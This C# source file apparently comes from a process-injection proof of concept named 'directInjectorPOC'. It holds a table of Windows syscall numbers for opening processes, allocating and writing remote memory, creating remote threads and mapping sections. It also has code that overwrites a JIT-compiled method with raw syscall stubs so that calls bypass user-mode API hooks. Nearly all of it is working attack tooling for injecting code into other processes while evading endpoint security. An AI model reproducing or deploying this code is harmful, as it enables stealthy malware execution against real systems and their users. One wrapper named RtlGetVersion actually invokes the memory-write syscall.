using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Collections;
using static directInjectorPOC.nativeStructs;
using System.Collections.Generic;
using System.Reflection.Emit;
using System.Reflection;

namespace directInjectorPOC
{
    class syscalls
    {


        public static byte[] syscallSkeleton = { 0x49, 0x89, 0xCA, 0xB8, 0xFF, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
        public static Dictionary<string, Dictionary<string, byte>> sysDic = new Dictionary<string, Dictionary<string, byte>>()
        {
            { "win10-1507", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB3},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1511", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB4},
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1607", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB6},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1703", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB9},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1709", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBA},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1803", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBB},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1809", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBC},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win10-1903-9", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xBD},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 }
                }
            },
            { "win8-12", new Dictionary<string, byte>()
                {
                    { "openprocess",0x24},
                    { "allocatevirtualmem", 0x16},
                    { "writevirtualmem", 0x38},
                    { "createremthread", 0xAF},
                    { "createsection", 0x48 },
                    { "mapviewofsec", 0x26 }
                }
            },
            { "win8.1-12r2", new Dictionary<string, byte>()
                {
                    { "openprocess",0x25},
                    { "allocatevirtualmem", 0x17},
                    { "writevirtualmem", 0x39},
                    { "createremthread", 0xB0},
                    { "createsection", 0x49 },
                    { "mapviewofsec", 0x27 }
                }
            },
            { "w7-08", new Dictionary<string, byte>()
                {
                    { "openprocess",0x23},
                    { "allocatevirtualmem", 0x15},
                    { "writevirtualmem", 0x37},
                    { "createremthread", 0xA5},
                    { "createsection", 0x47 },
                    { "mapviewofsec", 0x25 }
                }
            }
        };

        public unsafe static IntPtr getAdrressWithMSIL(byte[] syscall)
        {
            //begin memcopy en msil
            AppDomain appD = AppDomain.CurrentDomain;
            AssemblyName assName = new AssemblyName("MethodSmasher");
            AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
            AllowPartiallyTrustedCallersAttribute attr = new AllowPartiallyTrustedCallersAttribute();
            ConstructorInfo csInfo = attr.GetType().GetConstructors()[0];
            object[] obArray = new object[0];
            CustomAttributeBuilder cAttrB = new CustomAttributeBuilder(csInfo, obArray);
            assBuilder.SetCustomAttribute(cAttrB);
            ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodSmasher");
            UnverifiableCodeAttribute codAttr = new UnverifiableCodeAttribute();
            csInfo = codAttr.GetType().GetConstructors()[0];
            CustomAttributeBuilder modCAttrB = new CustomAttributeBuilder(csInfo, obArray);
            mBuilder.SetCustomAttribute(modCAttrB);
            TypeBuilder tBuilder = mBuilder.DefineType("MethodSmasher", TypeAttributes.Public);
            Type[] allParams = { typeof(IntPtr), typeof(IntPtr), typeof(Int32) };
            MethodBuilder methodBuilder = tBuilder.DefineMethod("OverwriteMethod", MethodAttributes.Public | MethodAttributes.Static, null, allParams);
            ILGenerator generator = methodBuilder.GetILGenerator();

            generator.Emit(OpCodes.Ldarg_0);
            generator.Emit(OpCodes.Ldarg_1);
            generator.Emit(OpCodes.Ldarg_2);
            generator.Emit(OpCodes.Volatile);
            generator.Emit(OpCodes.Cpblk);
            generator.Emit(OpCodes.Ret);

            var smasherType = tBuilder.CreateType();
            var overWriteMethod = smasherType.GetMethod("OverwriteMethod");
            //end memcopy en msil

            //begin xor dummy method
            appD = AppDomain.CurrentDomain;
            assName = new AssemblyName("SmashMe");
            assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
            attr = new AllowPartiallyTrustedCallersAttribute();
            csInfo = attr.GetType().GetConstructors()[0];
            obArray = new object[0];
            cAttrB = new CustomAttributeBuilder(csInfo, obArray);
            assBuilder.SetCustomAttribute(cAttrB);
            mBuilder = assBuilder.DefineDynamicModule("SmashMe");
            codAttr = new UnverifiableCodeAttribute();
            csInfo = codAttr.GetType().GetConstructors()[0];
            modCAttrB = new CustomAttributeBuilder(csInfo, obArray);
            mBuilder.SetCustomAttribute(modCAttrB);
            tBuilder = mBuilder.DefineType("SmashMe", TypeAttributes.Public);
            Int32 xorK = 0x41424344;
            Type[] allParams2 = { typeof(Int32) };
            methodBuilder = tBuilder.DefineMethod("OverwriteMe", MethodAttributes.Public | MethodAttributes.Static, typeof(Int32), allParams2);
            generator = methodBuilder.GetILGenerator();
            generator.DeclareLocal(typeof(Int32));
            generator.Emit(OpCodes.Ldarg_0);

            for (var x = 0; x < 13000; x++)
            {
                generator.Emit(OpCodes.Ldc_I4, xorK);
                generator.Emit(OpCodes.Xor);
                generator.Emit(OpCodes.Stloc_0);
                generator.Emit(OpCodes.Ldloc_0);
            }

            generator.Emit(OpCodes.Ldc_I4, xorK);
            generator.Emit(OpCodes.Xor);
            generator.Emit(OpCodes.Ret);

            var smashmeType = tBuilder.CreateType();
            var overwriteMeMethod = smashmeType.GetMethod("OverwriteMe");
            //end xor dummy method

            //jit the xor method
            for (var x = 0; x < 40; x++)
            {
                try
                {
                    var i = overwriteMeMethod.Invoke(null, new object[] { 0x11112222 });
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        string err = e.InnerException.Message;
                    }
                }
            }

            byte[] trap;


            if (IntPtr.Size == 4)
            {
                //32bits shcode
                trap = new byte[] { 0x90 };
            }
            else
            {
                //64bits shcode
                trap = new byte[] { 0x90 };
            }

            byte[] finalShellcode = new byte[trap.Length + syscall.Length];
            Buffer.BlockCopy(trap, 0, finalShellcode, 0, trap.Length);
            Buffer.BlockCopy(syscall, 0, finalShellcode, trap.Length, syscall.Length);

            IntPtr shellcodeAddress = Marshal.AllocHGlobal(finalShellcode.Length);

            Marshal.Copy(finalShellcode, 0, shellcodeAddress, finalShellcode.Length);

            IntPtr targetMethodAddress = getMethodAddress(overwriteMeMethod);

            object[] owParams = new object[] { targetMethodAddress, shellcodeAddress, finalShellcode.Length };
            try
            {
                overWriteMethod.Invoke(null, owParams);
            }
            catch (Exception e)
            {
                if (e.InnerException != null)
                {
                    string err = e.InnerException.Message;
                }
            }

            return targetMethodAddress;    
        }

        public static IntPtr getMethodAddress(MethodInfo minfo)
        {

            IntPtr retAd = new IntPtr();
            Type typeBuilded;

            if (minfo.GetMethodImplementationFlags() == MethodImplAttributes.InternalCall)
            {
                return IntPtr.Zero;
            }

            try
            {
                typeBuilded = Type.GetType("MethodLeaker", true);
            }
            catch
            {
                AppDomain appD = AppDomain.CurrentDomain;
                AssemblyName assName = new AssemblyName("MethodLeakAssembly");
                AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
                ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodLeakModule");
                TypeBuilder tBuilder = mBuilder.DefineType("MethodLeaker", TypeAttributes.Public);

                MethodBuilder metBuilder;
                if (IntPtr.Size == 4)
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);

                }
                else
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);
                }

                ILGenerator ilGen = metBuilder.GetILGenerator();

                ilGen.Emit(OpCodes.Ldftn, minfo);
                ilGen.Emit(OpCodes.Ret);

                typeBuilded = tBuilder.CreateType();
            }
            MethodInfo methodInfoBuilded = typeBuilded.GetMethod("LeakMethod");
            try
            {
                var obj = methodInfoBuilded.Invoke(null, null);
                retAd = (IntPtr)obj;
            }
            catch (Exception e)
            {
                Console.WriteLine(methodInfoBuilded.Name + " cannot return an unmanaged address.");
            }
            return retAd;
        }

        public static NTSTATUS ZwOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["openprocess"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

            return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
        }

        public static NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["createremthread"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtCreateThreadEx myAssemblyFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));

            return (NTSTATUS)myAssemblyFunction(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);

        }

        public static NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["writevirtualmem"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
        }


        public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["allocatevirtualmem"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
        }

        public static NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["createsection"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtCreateSection myAssemblyFunction = (Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateSection));

            return (NTSTATUS)myAssemblyFunction(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
        }

        public static NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["mapviewofsec"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.NtMapViewOfSection myAssemblyFunction = (Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtMapViewOfSection));

            return (NTSTATUS)myAssemblyFunction(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
        }

        public static NTSTATUS RtlGetVersion(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["writevirtualmem"];

            IntPtr memoryAddress = getAdrressWithMSIL(syscall);

            Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
        }


        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateThreadEx(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);


        }
    }
}
